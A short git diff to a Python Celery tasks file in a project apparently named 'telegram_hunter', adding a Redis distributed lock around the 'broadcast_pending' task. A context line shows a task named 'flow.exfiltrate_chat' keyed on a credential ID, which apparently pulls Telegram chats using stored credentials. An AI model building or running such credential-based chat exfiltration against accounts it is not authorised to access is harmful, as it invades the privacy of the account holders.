@@ -5,6 +5,11 @@ from app.core.database import db
 from app.core.security import security
 from app.services.scraper_srv import scraper_service
 from app.services.broadcaster_srv import broadcaster_service
+import redis
+from app.core.config import settings
+
+# Redis Client for Locking
+redis_client = redis.from_url(settings.REDIS_URL, decode_responses=True)
 
 @app.task(name="flow.exfiltrate_chat")
 def exfiltrate_chat(cred_id: str):
@@ -182,11 +187,26 @@ async def _enrich_logic(cred_id: str):
 
 @app.task(name="flow.broadcast_pending")
 def broadcast_pending():
-    loop = asyncio.get_event_loop()
-    if loop.is_closed():
-        loop = asyncio.new_event_loop()
-        asyncio.set_event_loop(loop)
-    return loop.run_until_complete(_broadcast_logic())
+    # Distributed Lock to prevent race conditions (e.g. Local Worker vs Prod Worker)
+    lock_key = "telegram_hunter:lock:broadcast"
+    # timeout=55s (slightly less than 60s schedule) to auto-release if crash
+    lock = redis_client.lock(lock_key, timeout=55, blocking=False)
+    
+    acquired = lock.acquire()
+    if not acquired:
+        return "Skipped: Broadcast task already running (Lock active)."
+
+    try:
+        loop = asyncio.get_event_loop()
+        if loop.is_closed():
+            loop = asyncio.new_event_loop()
+            asyncio.set_event_loop(loop)
+        return loop.run_until_complete(_broadcast_logic())
+    finally:
+        try:
+            lock.release()
+        except redis.exceptions.LockError:
+            pass # Lock expired or already released
 
 async def _broadcast_logic():
     # Query pending messages
